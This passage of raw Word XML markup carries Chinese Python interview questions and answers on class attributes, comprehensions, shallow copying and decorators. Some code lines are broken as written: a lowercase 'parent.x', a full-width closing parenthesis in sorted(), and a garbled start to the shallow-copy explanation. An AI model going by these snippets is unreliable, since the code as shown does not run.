          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>class</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> Child1(Parent):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CFAD1CB" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D4F1D75" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>class</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> Child2(Parent):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F29DAA3" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73B55D7A" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve"> 7</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>print</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(Parent.x, Child1.x, Child2.x)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD00F5A" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> Child1.x = 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BE9B741" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 9</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>print</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(Parent.x, Child1.x, Child2.x)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1027FE00" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> parent.x = 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6948011E" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>11</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>print</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(Parent.x, Child1.x, Child2.x)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A5FC1CE" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>12</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="169AB083" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>13</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09CCE0F1" w14:textId="60A0BF02" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>14</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 111 121 323</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D3414EA" w14:textId="1B255CB7" w:rsidR="00A63022" w:rsidRDefault="004300AE" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>003</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>写出</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>A0-A2</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的输出结果，并解释原因</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62133092" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> A0 = [i </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>for</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> i </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> range(10) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> i % 2 == 0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="153B2988" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> A1 = {i: i+2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>for</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> i </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> A0}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19B50DBE" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> A2 = sorted(A0, reverse=True）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51DCE280" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21EA3659" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3133B2C0" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>A0 = [0, 2, 4, 6, 8]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="275D2EFE" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> A1 = {0:2,2:4,4:6,6:8,8:10}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6BF840" w14:textId="3BB4CDBC" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> A2 = [8,6,4,2,0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="416E7BFB" w14:textId="20D8BE60" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="004300AE"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004</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>写出下列程序的输出</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46973203" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> a = [2, 5]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31667129" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> b = [a] * 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42100417" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> b = tuple(b)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B79CA28" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> b[0][0] = 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A4D5EA4" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>print</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(b)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="553461AA" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>print</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(a)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5593976A" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 7</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A24A37D" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA0AE0F" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 9</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>([4,5],[4,5],[4,5],[4,5])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC7792F" w14:textId="05CC89CE" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> [4,5]运算符来操作列表时浅拷贝，只拷贝最外边一层，内层还是原来的引用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3895C551" w14:textId="05E40E9D" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="004300AE"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005</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>写出下边代码打印的内容</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64BF98D4" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>def</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> decorate(func):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2556E624" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>print</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"func"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
